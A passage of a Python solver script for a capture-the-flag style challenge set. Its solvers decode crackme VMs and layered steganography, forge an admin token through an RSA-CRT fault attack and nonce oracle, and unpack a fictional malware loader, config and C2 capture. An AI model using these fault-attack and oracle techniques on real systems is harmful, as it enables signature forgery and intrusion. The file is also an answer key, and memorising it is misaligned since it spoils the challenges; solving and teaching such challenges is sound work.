        hits.append(j)
        start = j + 1
    assert len(hits) == 1, f"magic {magic!r} occurs {len(hits)} times"
    return hits[0]


def _h01_parse_blobs(data):
    pc = _h01_find_magic(data, H01_CFG)
    cfg_c = int.from_bytes(data[pc + 4:pc + 8], "little")
    vm_ctx = int.from_bytes(data[pc + 8:pc + 12], "little")
    env_def = int.from_bytes(data[pc + 12:pc + 16], "little")
    vm_ctx3 = int.from_bytes(data[pc + 16:pc + 20], "little")
    xlats = [data[_h01_find_magic(data, m) + 4:][:256]
             for m in (H01_XT1, H01_XT2, H01_XT3)]
    assert all(len(x) == 256 for x in xlats)

    def payload(p):
        ln = int.from_bytes(data[p + 4:p + 6], "little")
        return data[p + 6:p + 6 + ln]

    vm1 = payload(_h01_find_magic(data, H01_VM1))
    vm2_stored = payload(_h01_find_magic(data, H01_VM2))
    vm3_stored = payload(_h01_find_magic(data, H01_VM3))
    pvl = _h01_find_magic(data, H01_VLT)
    cipher = data[pvl + 4:pvl + 4 + H01_CIPHER_LEN]
    assert len(cipher) == H01_CIPHER_LEN
    return (cfg_c, vm_ctx, env_def, vm_ctx3, xlats, vm1, vm2_stored, vm3_stored, cipher)


def _h01_unmask(stored, base):
    return bytes(stored[i] ^ ((base >> (8 * (i & 3))) & 0xFF) for i in range(len(stored)))


def _h01_run_vms(vm_ctx, vm_ctx3, xlats, vm1, vm2_stored, vm3_stored):
    xlat1, xlat2, xlat3 = xlats
    v1 = _h01_vm_run(vm1, xlat1)
    v2 = _h01_vm_run(_h01_unmask(vm2_stored, v1 ^ 0x9E3779B9), xlat2)
    assert v2 == vm_ctx, f"chained-VM2 integrity mismatch ({v2:#010x} != {vm_ctx:#010x})"
    v3 = _h01_vm_run(_h01_unmask(vm3_stored, v2 ^ 0x85EBCA6B), xlat3)
    assert v3 == vm_ctx3, f"chained-VM3 integrity mismatch ({v3:#010x} != {vm_ctx3:#010x})"
    return v1, v2, v3


def solve_h01():
    gate = part("H01") / "zancudo_gate"
    data = gate.read_bytes()
    (cfg_c, vm_ctx, env_def, vm_ctx3, xlats, vm1, vm2_stored, vm3_stored,
     cipher) = _h01_parse_blobs(data)
    v1, v2, v3 = _h01_run_vms(vm_ctx, vm_ctx3, xlats, vm1, vm2_stored, vm3_stored)

    # brute-force the vault key by passphrase length (two-pass decryption)
    cands = []
    for ltry in range(1, H01_MAXLEN + 1):
        seed = _h01_derive_seed(cfg_c, ltry, env_def, v1, v2, v3)
        dec = _h01_decrypt_vault(cipher, seed, v3)
        if (int.from_bytes(dec[:4], "little") == ltry
                and set(dec[H01_OFF_SBOX:H01_OFF_SBOX + 256]) == H01_PERM):
            cands.append((ltry, seed, dec))
    assert len(cands) == 1, f"length brute-force not unique ({len(cands)} hits)"
    need, seed, dec = cands[0]

    sbox = list(dec[H01_OFF_SBOX:H01_OFF_SBOX + 256])
    k = list(dec[H01_OFF_K:H01_OFF_K + need])
    target = list(dec[H01_OFF_K + need:H01_OFF_K + 2 * need])
    cs_stored = int.from_bytes(dec[H01_OFF_K + 2 * need:H01_OFF_K + 2 * need + 4], "little")
    hx_stored = int.from_bytes(dec[H01_OFF_K + 2 * need + 4:H01_OFF_K + 2 * need + 8], "little")
    cr_stored = int.from_bytes(dec[H01_OFF_K + 2 * need + 8:H01_OFF_K + 2 * need + 12], "little")
    ps_stored = int.from_bytes(dec[H01_OFF_K + 2 * need + 12:H01_OFF_K + 2 * need + 16], "little")
    preimage = {}
    for b, s in enumerate(sbox):
        r = s % H01_MOD
        preimage[r] = None if r in preimage else b
    out = bytearray()
    for idx in range(need):
        r = (target[idx] * pow(k[idx], -1, H01_MOD)) % H01_MOD
        b = preimage.get(r)
        assert b is not None, f"byte {idx}: residue {r} has no unique pre-image"
        out.append(b)
    assert _h01_fnv1a(out) == cs_stored, "FNV-1a checksum gate disagrees"
    assert _h01_hmix(out, seed) == hx_stored, "mixing gate disagrees"
    assert _h01_gate_crc(out, (v3 ^ H01_CRC_XOR) & 0xFFFFFFFF) == cr_stored, \
        "CRC-style gate disagrees"
    assert _h01_gate_pos(out, seed) == ps_stored, "rotate/xor gate disagrees"
    flag = out.decode()

    try:
        gate.chmod(gate.stat().st_mode | 0o111)
    except OSError:
        pass
    run = subprocess.run(["wsl.exe", "-e", "bash", "-lc",
                          f"env -u ZANCUDO_ENTROPY -u ZANCUDO_SERVICE "
                          f"'{_wsl_path(gate)}' '{flag}'"],
                         capture_output=True, text=True)
    assert "ZANCUDO DEADBOLT RELEASED" in run.stdout and run.returncode == 0, \
        (run.returncode, run.stdout, run.stderr)
    _record("H01", flag,
            f"3 chained VMs -> two-pass vault (len={need}) + FNV/mix/CRC/pos + live exec")


# ---------------------------------------------------------------------------
# H02 - weighted freeway: subgraph iso + norm-Laplacian spectrum + spanning-tree tau
# ---------------------------------------------------------------------------
def _h02_weighted_adj(nodes, G):
    idx = {n: i for i, n in enumerate(nodes)}
    A = np.zeros((len(nodes), len(nodes)), dtype=float)
    for u, v, data in G.edges(data=True):
        if u in idx and v in idx:
            w = float(data.get("weight", 1.0))
            A[idx[u], idx[v]] = w
            A[idx[v], idx[u]] = w
    return A


def _h02_fingerprint(nodes, G):
    A = _h02_weighted_adj(nodes, G)
    d = A.sum(axis=1)
    dinv = 1.0 / np.sqrt(d)
    Ln = np.eye(len(nodes)) - np.diag(dinv) @ A @ np.diag(dinv)
    return tuple(round(float(x), 4) + 0.0 for x in np.linalg.eigvalsh(Ln))


def _h02_spanning_tau(nodes, G):
    A = _h02_weighted_adj(nodes, G)
    lap = np.diag(A.sum(axis=1)) - A
    return int(round(float(np.linalg.det(lap[:-1, :-1]))))


def _h02_combined_order(nodes, G):
    A = _h02_weighted_adj(nodes, G)
    _, vecs = np.linalg.eigh(A)
    c = vecs[:, -1]
    if c.sum() < 0:
        c = -c
    d = A.sum(axis=1)
    dinv = 1.0 / np.sqrt(d)
    Ln = np.eye(len(nodes)) - np.diag(dinv) @ A @ np.diag(dinv)
    _, vecs2 = np.linalg.eigh(Ln)
    f = vecs2[:, 1]
    if f[np.argmax(np.abs(f))] < 0:
        f = -f
    key = {n: (-round(float(c[i]), 4), round(float(f[i]), 6))
           for i, n in enumerate(nodes)}
    return sorted(nodes, key=lambda n: key[n])


def solve_h02():
    tpl = json.loads((part("H02") / "template.json").read_text())
    jn = json.loads((part("H02") / "junctions.json").read_text())
    T = nx.Graph()
    T.add_nodes_from(n["id"] for n in tpl["nodes"])
    for u, v, w in tpl["edges"]:
        T.add_edge(u, v, weight=w)
    J = nx.Graph()
    for n in jn["nodes"]:
        J.add_node(n["id"], label=n["label"])
    for u, v, w in jn["edges"]:
        J.add_edge(u, v, weight=w)

    tpl_fp = _h02_fingerprint(list(T.nodes()), T)
    tpl_tau = _h02_spanning_tau(list(T.nodes()), T)
    winners = []
    for m in GraphMatcher(J, T).subgraph_monomorphisms_iter():
        cand = list(m.keys())
        if (_h02_fingerprint(cand, J.subgraph(cand)) == tpl_fp
                and _h02_spanning_tau(cand, J.subgraph(cand)) == tpl_tau):
            winners.append(cand)
    assert len(winners) == 1, f"expected a unique invariant-B district, got {len(winners)}"
    matched = sorted(winners[0])
    order = _h02_combined_order(matched, J.subgraph(matched))
    flag = "FTA{" + "".join(J.nodes[n]["label"] for n in order) + "}"
    _record("H02", flag,
            f"spectrum + spanning-tree tau over {J.number_of_nodes()}-node weighted freeway")


# ---------------------------------------------------------------------------
# H03 - nine-shell matryoshka (geogate mask -> masked LSB -> AES-CTR -> ZIP vault
#       -> AES-GCM(AAD) -> MTX-81 -> Huffman -> route-keyed CTR -> exec)
# ---------------------------------------------------------------------------
H03_W, H03_H = 200, 160
H03_MATRIX_N = 81
H03_TSIZE = {1: 1, 2: 1, 3: 2, 4: 4, 5: 8, 7: 1}
H03_SALT_GATE = b"impound-geogate-7"
H03_SALT_CTR = b"lspd-impound-2026"
H03_SALT_GCM = b"evac-vault-7731"
H03_SALT_STAGE = b"matryoshka-seal"
H03_ITER = 100000
H03_VAULT_OPEN = b"--#VAULT-BEGIN--#\n"
H03_VAULT_CLOSE = b"\n--#VAULT-END--#\n"


def _h03_parse_freq():
    note = (part("H03") / "EVIDENCE_NOTE.txt").read_text(encoding="utf-8")
    block = re.search(r"\[LEDGER-BEGIN\]\n(.*?)\n\[LEDGER-END\]", note, re.S).group(1)
    freqs = {}
    for line in block.splitlines():
        line = line.strip()
        if line:
            code, cnt = line.split()
            freqs[chr(int(code))] = int(cnt)
    return freqs


def _h03_build_codes(freqs):
    import heapq
    heap, seq = [], 0
    for ch in sorted(freqs):
        heap.append([freqs[ch], seq, ch])
        seq += 1
    heapq.heapify(heap)
    if len(heap) == 1:
        return {heap[0][2]: "0"}
    while len(heap) > 1:
        a = heapq.heappop(heap)
        b = heapq.heappop(heap)
        heapq.heappush(heap, [a[0] + b[0], seq, (a[2], b[2])])
        seq += 1
    codes = {}

    def walk(node, prefix):
        if isinstance(node, str):
            codes[node] = prefix or "0"
            return
        walk(node[0], prefix + "0")
        walk(node[1], prefix + "1")

    walk(heap[0][2], "")
    return codes


def _h03_gating(freqs):
    d = len(freqs)
    t = sum(freqs.values())
    stride = (d % 7) + 2
    return stride, t % stride


def _h03_read_gps():
    raw = Image.open(part("H03") / "impound_camera.png").info.get("exif")
    assert raw and raw[:6] == b"Exif\x00\x00", "no EXIF in PNG"
    tiff = raw[6:]
    assert tiff[:2] == b"II", "expected little-endian TIFF"
    off0 = struct.unpack("<I", tiff[4:8])[0]

    def ifd(off):
        n = struct.unpack("<H", tiff[off:off + 2])[0]
        res = {}
        for i in range(n):
            e = off + 2 + 12 * i
            tag, typ, count = struct.unpack("<HHI", tiff[e:e + 8])
            res[tag] = (typ, count, tiff[e + 8:e + 12])
        return res

    def payload(entry):
        typ, count, val4 = entry
        size = H03_TSIZE[typ] * count
        if size <= 4:
            return val4[:size]
        o = struct.unpack("<I", val4)[0]
        return tiff[o:o + size]

    gps = ifd(struct.unpack("<I", ifd(off0)[0x8825][2])[0])

    def rationals(tag):
        _typ, count, _ = gps[tag]
        d = payload(gps[tag])
        return [struct.unpack("<II", d[k * 8:k * 8 + 8]) for k in range(count)]

    def ref(tag):
        return payload(gps[tag]).split(b"\x00", 1)[0].decode()

    return rationals(0x0002), ref(0x0001), rationals(0x0004), ref(0x0003)


def _h03_gps_code(lat, lon):
    def dec(dms):
        return dms[0][0] + dms[1][0] / 60 + (dms[2][0] / dms[2][1]) / 3600
    a = round(abs(dec(lat)) * 10000) % 100000
    b = round(abs(dec(lon)) * 10000) % 100000
    return f"{a:05d}{b:05d}"


def _h03_read_gate_card():
    im = Image.open(part("H03") / "impound_camera.png")
    gate_hex = None
    for bag in (getattr(im, "text", None), im.info):
        if bag and "gate.card" in bag:
            gate_hex = bag["gate.card"]
            break
    assert gate_hex is not None, "gate.card chunk missing"
    blob = bytes.fromhex(gate_hex)
    return blob[:16], blob[16:]


def _h03_gate_mask(gate_blob, code):
    nonce, ct = gate_blob
    key = PBKDF2(("GEO-" + code).encode(), H03_SALT_GATE, dkLen=32,
                 count=H03_ITER, hmac_hash_module=SHA256)
    return AES.new(key, AES.MODE_CTR, nonce=b"",
                   initial_value=int.from_bytes(nonce, "big")).decrypt(ct)


def _h03_extract_payload(stride, offset, mask):
    px = Image.open(part("H03") / "impound_camera.png").convert("RGB").load()
    bits, slot = [], 0
    for x in range(H03_W):
        for y in range(H03_H):
            for c in px[x, y]:
                if slot % stride == offset:
                    bits.append((c >> 1) & 1)
                    bits.append(c & 1)
                slot += 1
    data = bytearray()
    for i in range(0, (len(bits) // 8) * 8, 8):
        data.append(int("".join(str(b) for b in bits[i:i + 8]), 2))
    n = int.from_bytes(data[:4], "big")
    masked = bytes(data[4:4 + n])
    payload = bytes(b ^ mask[i % 16] for i, b in enumerate(masked))
    return payload[:16], payload[16:]


def _h03_ctr_decrypt(blob, pwd, salt):
    key = PBKDF2(pwd.encode(), salt, dkLen=32, count=H03_ITER, hmac_hash_module=SHA256)
    nonce, ct = blob[:16], blob[16:]
    return AES.new(key, AES.MODE_CTR, nonce=b"",
                   initial_value=int.from_bytes(nonce, "big")).decrypt(ct)


def _h03_read_zip_block(password):
    data = (part("H03") / "impound_camera.png").read_bytes()
    z0 = data.index(H03_VAULT_OPEN) + len(H03_VAULT_OPEN)
    z1 = data.index(H03_VAULT_CLOSE, z0)
    zf = zipfile.ZipFile(io.BytesIO(data[z0:z1]))
    zf.setpassword(password.encode())
    return zf


def _h03_gcm_decrypt(blob, badge, code, tag, mask):
    key = PBKDF2((badge + ":" + code).encode(), H03_SALT_GCM,
                 dkLen=32, count=H03_ITER, hmac_hash_module=SHA256)
    nonce = SHA256.new(b"gcm" + tag).digest()[:12]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(mask)
    return cipher.decrypt_and_verify(blob[:-16], blob[-16:])


def _h03_decode_matrix(png_bytes):
    arr = np.array(Image.open(io.BytesIO(png_bytes)).convert("L"))
    ys, xs = np.where(arr < 128)
    content = arr[ys.min():ys.max() + 1, xs.min():xs.max() + 1]
    m = content.shape[0] // H03_MATRIX_N
    grid = np.zeros((H03_MATRIX_N, H03_MATRIX_N), dtype=int)
    for gy in range(H03_MATRIX_N):
        for gx in range(H03_MATRIX_N):
            grid[gy, gx] = 1 if content[int((gy + 0.5) * m), int((gx + 0.5) * m)] < 128 else 0
    for k in range(4):
        g = np.rot90(grid, k)
        if all(g[0, i] == (1 if i % 2 == 0 else 0) and g[i, 0] == (1 if i % 2 == 0 else 0)
               for i in range(H03_MATRIX_N)):
            bits = [int(g[y, x]) for y in range(1, H03_MATRIX_N) for x in range(1, H03_MATRIX_N)]
            d = bytearray()
            for i in range(0, (len(bits) // 8) * 8, 8):
                d.append(int("".join(str(x) for x in bits[i:i + 8]), 2))
            n = int.from_bytes(d[:2], "big")
            return bytes(d[2:2 + n]).decode("ascii")
    raise ValueError("MTX-1 sync ladders not found")


def _h03_huffman_decode(stream, codes):
    rev = {v: k for k, v in codes.items()}
    count = int.from_bytes(stream[:2], "big")
    out, cur = [], ""
    for bit in "".join(f"{b:08b}" for b in stream[2:]):
        cur += bit
        if cur in rev:
            out.append(rev[cur])
            cur = ""
            if len(out) == count:
                break
    assert len(out) == count, "huffman decode underrun"
    return "".join(out)


def _h03_walk_to_stage():
    freqs = _h03_parse_freq()
    codes = _h03_build_codes(freqs)
    stride, offset = _h03_gating(freqs)

    # S1: GPS -> CODE -> gate card -> MASK
    lat, _latref, lon, _lonref = _h03_read_gps()
    code = _h03_gps_code(lat, lon)
    mask = _h03_gate_mask(_h03_read_gate_card(), code)
    assert len(mask) == 16, "gate mask wrong size"

    # S2: gated + masked LSB -> TAG, CTR_BLOB
    tag, ctr_blob = _h03_extract_payload(stride, offset, mask)

    # S3: AES-256-CTR -> BADGE
    badge = _h03_ctr_decrypt(ctr_blob, "IMPOUND-" + code, H03_SALT_CTR).decode("ascii")
    assert badge, "empty badge"

    # S4: password-gated ZIP vault -> GCM blob
    gcm_blob = _h03_read_zip_block(badge).read("layer4.bin")

    # S5: AES-256-GCM (AAD = mask) -> matrix PNG
    matrix_png = _h03_gcm_decrypt(gcm_blob, badge, code, tag, mask)
    assert matrix_png[:8] == b"\x89PNG\r\n\x1a\n", "shell5 plaintext is not a PNG"

    # S6: MTX-81 matrix -> ROUTE_KEY | base64url(STREAM)
    combined = _h03_decode_matrix(matrix_png)
    route_key, b64stream = combined.split("|", 1)
    assert re.fullmatch(r"[A-Za-z0-9_\-]+", route_key), f"route key shape off: {route_key!r}"
    stream = base64.urlsafe_b64decode(b64stream)

    # S7: Huffman -> SEAL_TOKEN | base64(SEALED_SOURCE)
    seal_token, b64sealed = _h03_huffman_decode(stream, codes).split("|", 1)
    sealed = base64.b64decode(b64sealed)

    # S8: AES-256-CTR (key from ROUTE_KEY) -> Python source
    src = _h03_ctr_decrypt(sealed, route_key, H03_SALT_STAGE).decode("utf-8")
    assert "hashlib" in src, "shell8 plaintext is not the expected stage"
    return src, seal_token


def solve_h03():
    src, seal_token = _h03_walk_to_stage()

    # S9: execute the recovered stage with the SEAL token as argv[1]
    import contextlib
    buf = io.StringIO()
    old_argv = sys.argv
    sys.argv = ["stage.py", seal_token]
    try:
        with contextlib.redirect_stdout(buf):
            exec(src, {})
    finally:
        sys.argv = old_argv
    flag = re.search(r"FTA\{[a-z0-9_]+\}", buf.getvalue()).group(0)
    _record("H03", flag,
            "9 shells: geogate mask -> LSB -> CTR -> ZIP -> GCM(AAD) -> MTX-81 -> Huffman -> CTR -> exec")


# ---------------------------------------------------------------------------
# H04 - blinded RSA-CRT fault attack + live-nonce oracle (participant gateway)
# ---------------------------------------------------------------------------
def solve_h04():
    import importlib.util
    os.environ["FTA_H04_FLAG"] = FL["H04"]
    spec = importlib.util.spec_from_file_location("h04_gw", str(part("H04") / "bank_gateway.py"))
    gw = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gw)

    n, e = gw.public_params()
    guard = gw.GUARD_LEN

    # (1) Every debug answer is BLINDED: the gateway signs (m * r^e) and hands
    #     back r, so we must un-blind (sig_real = sig_blind * r^-1 mod n) before
    #     the fault attack is meaningful.  Collect one honest and one faulty.
    probe = b"REF:probe:balance:0001"
    m = int.from_bytes(probe, "big")
    assert m < n
    good = bad = bad_raw = None
    for seed in range(200000):
        r = gw.sign_debug(probe, seed)
        sig_raw = int(r["signature"], 16)
        unblinded = (sig_raw * pow(int(r["blind"], 16), -1, n)) % n
        if r["fault"] and bad is None:
            bad, bad_raw = unblinded, sig_raw
        elif not r["fault"] and good is None:
            good = unblinded
        if good is not None and bad is not None:
            break
    assert good is not None and bad is not None, "could not obtain both signatures"

    # trap control: the RAW (still-blinded) faulty answer must NOT split n.
    assert math.gcd((pow(bad_raw, e, n) - m) % n, n) == 1, \
        "raw blinded fault unexpectedly factored n"

    # the un-blinded honest answer must be a genuine signature of the probe.
    assert pow(good, e, n) == m % n, "un-blinded signature does not verify"

    # (2) Fault attack: the faulty half is still correct modulo the untouched
    #     prime, so n and (bad^e - m) share exactly one factor (p OR q).
    g = math.gcd((pow(bad, e, n) - m) % n, n)
    assert 1 < g < n, "fault attack failed to split n"
    p, q = g, n // g
    assert p * q == n, "recovered factors do not multiply back to n"
    d = pow(e, -1, (p - 1) * (q - 1))

    # (3) Recover the live per-process audit nonce one byte at a time through
    #     the quiet early-exit verify_debug oracle.
    nonce = bytearray()
    for i in range(guard):
        for b in range(256):
            cand = bytes(nonce) + bytes([b]) + bytes(guard - len(nonce) - 1)
            if gw.verify_debug(cand.hex())["match"] == i + 1:
                nonce.append(b)
                break
        else:
            raise AssertionError("nonce oracle stalled at byte %d" % i)
    nonce_hex = bytes(nonce).hex()

    # (4) Assemble the admin order from its fields + live nonce, sign it with
    #     the recovered d, attach the nonce + a fresh stamp, and submit.
    msg = gw.ADMIN_MESSAGE.replace("__NONCE__", nonce_hex)
    forged = pow(int.from_bytes(msg.encode(), "big"), d, n)
    token = {"role": "admin", "msg": msg, "sig": format(forged, "x"),
             "nonce": nonce_hex, "ts": int(time.time())}

    # trap controls: the pinned decoy VERIFIES but is refused by submit; a
    # fresh guest token dies on the role gate.
    assert gw.verify(gw.DECOY_TOKEN) is True, "decoy should verify under the naive reading"
    assert gw.submit(gw.DECOY_TOKEN) is None, "decoy must be rejected"
    assert gw.submit(gw.issue_guest_token()) is None, "guest token unlocked the flag"
    assert gw.verify(token) is True, "forged token failed verify"

    flag = gw.submit(token)
    assert flag == FL["H04"], flag
    _record("H04", flag, "un-blind debug sigs -> gcd fault split -> nonce oracle -> forged admin token")


# ---------------------------------------------------------------------------
# H05 - weighted 4-party agreement break (bound vs reduced shares)
# ---------------------------------------------------------------------------
H05_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
H05_SALT = b"ESCAPE-3/hkdf/salt/v2"
H05_INFO = b"ESCAPE-3/session-key/v2"
H05_CONFIRM = b"ESCAPE-3/confirm/v2"
H05_INNER_SALT = b"ESCAPE-3/inner-cbc/v2"
H05_INNER_INFO = b"inner-vault"
H05_W = (5, 11, 13, 17)          # weights for A, B, C, D
H05_T_SID, H05_T_CONFIRM = 0x0002, 0x0020
H05_T_A, H05_T_B, H05_T_C, H05_T_D = 0x0010, 0x0011, 0x0012, 0x0013


def read_tlvs(buf):
    out, i = [], 0
    while i + 6 <= len(buf):
        typ, ln = struct.unpack(">HI", buf[i:i + 6])
        i += 6
        out.append((typ, buf[i:i + ln]))
        i += ln
    return out


def _h05_hkdf(salt, ikm, info, length=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, ctr = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([ctr]), hashlib.sha256).digest()
        okm += t
        ctr += 1
    return okm[:length]


def _h05_key(sid, xa, xb, xc, xd):
    g = lambda b: int.from_bytes(b, "big")
    y = (pow(g(xa), H05_W[0], H05_P) * pow(g(xb), H05_W[1], H05_P)
         * pow(g(xc), H05_W[2], H05_P) * pow(g(xd), H05_W[3], H05_P)) % H05_P
    return _h05_hkdf(H05_SALT, y.to_bytes(32, "big"), H05_INFO + sid, 32)


def _h05_confirm(K, sid, xa, xb, xc):
    return hmac.new(K, H05_CONFIRM + sid + xa + xb + xc, hashlib.sha256).digest()[:16]


def solve_h05():
    recs = read_tlvs((part("H05") / "intercept.bin").read_bytes())
    sid = next(v for t, v in recs if t == H05_T_SID)
    a_all = [v for t, v in recs if t == H05_T_A]
    b_all = [v for t, v in recs if t == H05_T_B]
    c_all = [v for t, v in recs if t == H05_T_C]
    d_all = [v for t, v in recs if t == H05_T_D]
    confirm = [v for t, v in recs if t == H05_T_CONFIRM][0]

    # Framing: A and B are BOUND (32-byte element + 16-byte binding tag); C and
    # D are REDUCED (bare 32-byte element) and re-advertised, so the most recent
    # advertisement of each wins.
    assert len(a_all) == 1 and len(a_all[0]) == 48
    assert len(b_all) == 1 and len(b_all[0]) == 48
    assert c_all and all(len(v) == 32 for v in c_all)
    assert d_all and all(len(v) == 32 for v in d_all)
    xa, xb = a_all[0][:32], b_all[0][:32]
    xc, xd = c_all[-1], d_all[-1]

    K = _h05_key(sid, xa, xb, xc, xd)
    assert _h05_confirm(K, sid, xa, xb, xc) == confirm, "derived key fails confirmation"

    # trap control: an earlier (superseded) C advertisement must not confirm.
    if len(c_all) > 1:
        stale = _h05_key(sid, xa, xb, c_all[0], xd)
        assert _h05_confirm(stale, sid, xa, xb, c_all[0]) != confirm

    # payload is double-wrapped: AES-GCM (outer) over AES-CBC (inner).
    blob = (part("H05") / "final_payload.enc").read_bytes()
    nonce, body = blob[:12], blob[12:]
    inner = AES.new(K, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(body[:-16], body[-16:])
    iv, cbc = inner[:16], inner[16:]
    ik = _h05_hkdf(H05_INNER_SALT, K, H05_INNER_INFO, 32)
    pt = unpad(AES.new(ik, AES.MODE_CBC, iv=iv).decrypt(cbc), 16).decode()
    flag = pt.split("flag=")[1].splitlines()[0].strip()
    assert flag == FL["H05"], flag
    _record("H05", flag, "bound/reduced share framing -> weighted HKDF -> nested GCM over CBC")


# ---------------------------------------------------------------------------
# M06 - Nightshift Loader (Part 1): private packer -> rotated key table,
#       SHA-256 counter keystream, CRC32 gate, custom base-40 alphabet.
# ---------------------------------------------------------------------------
M06_ALPHABET = "z0q1m2p3v4x5k6b7n8w9_t!r@d#gcfhyjlasoeiu"


def _m06_rotate(key, r):
    r %= len(key)
    return key[r:] + key[:r]


def _m06_b40(s):
    base = len(M06_ALPHABET)
    v = 0
    for ch in s:
        v = v * base + M06_ALPHABET.index(ch)
    return v.to_bytes((v.bit_length() + 7) // 8, "big")


def _m06_sections(buf):
    assert buf[:4] == b"NSLF", "not a Nightshift loader container"
    rort = buf[6]
    i, sec = 7, {}
    while i + 8 <= len(buf):
        tag, ln = buf[i:i + 4], struct.unpack("<I", buf[i + 4:i + 8])[0]
        i += 8
        sec[tag] = buf[i:i + ln]
        i += ln
    return rort, sec


def _m06_recover():
    """Return (flag, dispatch_token_bytes) from the shipped container."""
    rort, sec = _m06_sections((part("M06") / "nightshift_loader.bin").read_bytes())
    key = _m06_rotate(sec[b"KEYT"], -rort)
    pack = sec[b"PACK"]
    crc = struct.unpack("<I", pack[:4])[0]
    ks, c = bytearray(), 0
    while len(ks) < len(pack) - 4:
        ks += hashlib.sha256(key + struct.pack("<I", c)).digest()
        c += 1
    enc = bytes(a ^ b for a, b in zip(pack[4:], ks))
    assert zlib.crc32(enc) & 0xFFFFFFFF == crc, "PACK body failed its CRC gate"
    payload = _m06_b40(enc.decode("ascii"))
    fields = dict(line.split(b":", 1) for line in payload.split(b"\n") if b":" in line)
    return fields[b"FLAG"].decode(), bytes.fromhex(fields[b"TOKEN"].decode())


def solve_m06():
    flag, token = _m06_recover()
    assert len(token) == 16, "dispatch token must be 16 bytes"
    _record("M06", flag, "rotated key table + SHA-256 keystream + CRC gate + custom base-40")


# ---------------------------------------------------------------------------
# M07 - Nightshift Config (Part 2): heap-smeared XOR key + token-keyed blobs.
# ---------------------------------------------------------------------------
def _m07_sections(buf):
    assert buf[:4] == b"NSCF", "not a Nightshift config container"
    i, sec = 6, {}
    while i + 8 <= len(buf):
        tag, ln = buf[i:i + 4], struct.unpack("<I", buf[i + 4:i + 8])[0]
        i += 8
        sec[tag] = buf[i:i + ln]
        i += ln
    return sec


def _m07_keystream(key, n, iv):
    out, i = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(key + iv + struct.pack("<I", i)).digest()
        i += 1
    return bytes(out[:n])


def _m07_mac(key, data):
    mk = hashlib.sha256(b"NS-CFG-MAC" + key).digest()
    return hmac.new(mk, data, hashlib.sha256).digest()[:16]


def _m07_dec(key, blob):
    iv, ct, tag = blob[:8], blob[8:-16], blob[-16:]
    assert _m07_mac(key, iv + ct) == tag, "config section authentication tag mismatch"
    ks = _m07_keystream(key, len(ct), iv)
    return bytes(a ^ b for a, b in zip(ct, ks))


def _m07_ram_key():
    buf = (part("M07") / "ram_slice.bin").read_bytes()
    assert buf[:6] == b"NSRAM1", "not a heap slice"
    n = struct.unpack("<H", buf[8:10])[0]
    i, key = 10, None
    for _ in range(n):
        name, status = buf[i:i + 4], buf[i + 4]
        data, chk = buf[i + 5:i + 13], buf[i + 13]
        i += 16
        assert (sum(data) ^ 0x5A) & 0xFF == chk, f"heap record {name!r} failed its check"
        if status == 1 and name in (b"KEY0", b"KEY1", b"KEY2", b"KEY3"):
            key = data if key is None else bytes(a ^ b for a, b in zip(key, data))
    assert key is not None, "live key allocations not found"
    return key


def _m07_recover():
    """Return (flag, host, port, session_id_bytes)."""
    _, token = _m06_recover()
    sec = _m07_sections((part("M07") / "nightshift_config.bin").read_bytes())
    assert sec[b"TAGV"] == _m07_mac(token, b"ns-config-tag"), "dispatch token rejected"
    key = hashlib.sha256(b"NS-CFG-KEY" + token + _m07_ram_key()).digest()
    text = _m07_dec(key, sec[b"LIVE"]).decode("ascii")
    fields = dict(l.split(":", 1) for l in text.splitlines() if ":" in l)
    host, port = fields["C2"].rsplit(":", 1)
    return fields["FLAG"], host, int(port), bytes.fromhex(fields["SESSION"])


def solve_m07():
    flag, _host, _port, sid = _m07_recover()
    assert len(sid) == 16, "session id must be 16 bytes"
    _record("M07", flag, "heap-smeared XOR key + token KDF + HMAC-gated LIVE section")


# ---------------------------------------------------------------------------
# M08 - Nightshift C2 (Part 3): HMAC-gated, chained stateful C2 transcript.
# ---------------------------------------------------------------------------
M08_MAGIC = b"NC2\x01"


def _m08_mac_key(sid):
    return hashlib.sha256(b"NS-C2-MAC" + sid).digest()


def _m08_frame_mac(sid, hv, ct):
    return hmac.new(_m08_mac_key(sid), hv + ct, hashlib.sha256).digest()[:16]


def _m08_ks(prev, nonce, seq, n):
    out, i = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(b"NS-C2-KS" + prev + nonce
                              + struct.pack("<I", seq) + struct.pack("<I", i)).digest()
        i += 1
    return bytes(out[:n])


def _m08_pcap_flows(path):
    raw = path.read_bytes()
    assert struct.unpack("<I", raw[:4])[0] == 0xA1B2C3D4, "unsupported pcap magic"
    off, n = 24, len(raw)
    order, flows = [], {}
    while off + 16 <= n:
        _ts, _tu, incl, _orig = struct.unpack("<IIII", raw[off:off + 16])
        off += 16
        pkt = raw[off:off + incl]
        off += incl
        if len(pkt) < 20 or (pkt[0] >> 4) != 4 or pkt[9] != 6:
            continue
        ihl = (pkt[0] & 0x0F) * 4
        t = pkt[ihl:]
        if len(t) < 20:
            continue
        sport, dport = struct.unpack(">HH", t[:4])
        payload = t[(t[12] >> 4) * 4:]
        if not payload:
            continue
        key = (bytes(pkt[12:16]), bytes(pkt[16:20]), sport, dport)
        if key not in flows:
            flows[key] = bytearray()
            order.append(key)
        flows[key] += payload
    return [(k, bytes(flows[k])) for k in order]


def _m08_frames(blob):
    out, i, n = [], 0, len(blob)
    while i + 27 <= n:
        j = blob.find(M08_MAGIC, i)
        if j < 0 or j + 27 > n:
            break
        ftype = blob[j + 4]
        seq = struct.unpack("<I", blob[j + 5:j + 9])[0]
        nonce = blob[j + 9:j + 25]
        ln = struct.unpack("<H", blob[j + 25:j + 27])[0]
        end = j + 27 + ln + 16
        if ln > 4096 or end > n:
            i = j + 1
            continue
        out.append((ftype, seq, nonce, blob[j + 27:j + 27 + ln],
                    blob[j + 27 + ln:end], blob[j:j + 27]))
        i = end
    return out


def _m08_recover():
    """Return the Part-3 flag, keyed by Part 2's C2 endpoint + session id."""
    _f2, _host, port, sid = _m07_recover()
    pts = []
    for (_src, _dst, _sp, dport), blob in _m08_pcap_flows(part("M08") / "nightshift_c2.pcap"):
